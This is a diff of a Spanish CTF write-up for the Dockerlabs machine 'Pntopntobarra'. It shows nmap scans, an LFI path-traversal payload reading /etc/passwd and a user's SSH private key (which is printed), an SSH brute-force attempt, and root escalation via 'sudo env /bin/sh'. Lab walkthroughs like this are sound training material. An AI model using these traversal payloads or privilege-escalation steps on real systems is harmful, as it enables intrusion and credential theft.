@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Pntopntobarra 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Pntopntobarra ​​
+
+## 🖥️ Writeup - Pntopntobarra
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `LFI` `Sudoers` `Env`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip pntopntobarra.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh pntopntobarra.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 16:05 CEST
 Nmap scan report for 172.17.0.2
@@ -82,13 +91,13 @@ Tenemos abiertos los puertos `22` y `80`.
 
 Accedemos por `HTTP` y observamos una página de advertencia de virus con dos botones.
 
-![alt text](../../images/virus.png)
+![alt text](../../.gitbook/assets/virus.png)
 
 El primer botón ejecuta un `script` que bloquea la máquina por completo, obligándonos a reiniciarla.
 
 Si pulsamos el segundo botón, aparece el siguiente mensaje:
 
-![alt text](../../images/ejemplos.png)
+![alt text](../../.gitbook/assets/ejemplos.png)
 
 Está intentando mostrar una imagen que no existe. Lo confirmamos observando la URL.
 
@@ -96,7 +105,7 @@ Está intentando mostrar una imagen que no existe. Lo confirmamos observando la 
 http://172.17.0.2/ejemplos.php?images=./ejemplo1.png
 ```
 
-# LFI
+## LFI
 
 Podemos aprovechar esto para intentar apuntar a otro archivo local del sistema, como `/etc/passwd`, modificando la URL.
 
@@ -105,6 +114,7 @@ http://172.17.0.2/ejemplos.php?images=../../../../etc/passwd
 ```
 
 Info:
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -133,7 +143,7 @@ nico:x:1000:1000:,,,:/home/nico:/bin/bash
 
 De esta manera, comprobamos que existe un usuario llamado `nico`.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Probamos un ataque de `fuerza bruta` sobre el puerto `22` (`SSH`) con dicho usuario.
 
@@ -145,7 +155,7 @@ Pero no obtenemos ninguna coincidencia.
 
 Aun así, sabemos con certeza que `nico` es un usuario válido del sistema. Es posible que únicamente pueda acceder por `SSH` mediante una clave `id_rsa`.
 
-# LFI
+## LFI
 
 Aprovechamos de nuevo la vulnerabilidad `LFI` para comprobar si podemos apuntar al archivo `id_rsa` (en caso de que exista), lo cual nos daría acceso por `SSH` al usuario `nico`.
 
@@ -154,6 +164,7 @@ http://172.17.0.2/ejemplos.php?images=../../../../home/nico/.ssh/id_rsa
 ```
 
 Info:
+
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -195,8 +206,7 @@ ayyxi3hh3t9P8AAAARbmljb0AzYTQ4YjEyYjU3YTIBAg==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-Efectivamente, logramos obtener la clave `id_rsa`, que guardamos en un archivo en la máquina atacante.
-A continuación, accedemos al sistema como el usuario `nico`.
+Efectivamente, logramos obtener la clave `id_rsa`, que guardamos en un archivo en la máquina atacante. A continuación, accedemos al sistema como el usuario `nico`.
 
 ```bash
 sudo nano id_rsa
@@ -204,15 +214,16 @@ chmod 600 id_rsa
 ssh -i id_rsa nico@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for nico on f7d1835da2a8:
     env_reset, mail_badpass,
@@ -230,9 +241,11 @@ sudo env /bin/sh
 ```
 
 Info:
+
 ```
 # whoami
 root
 #
 ```
+
 Ya somos root!
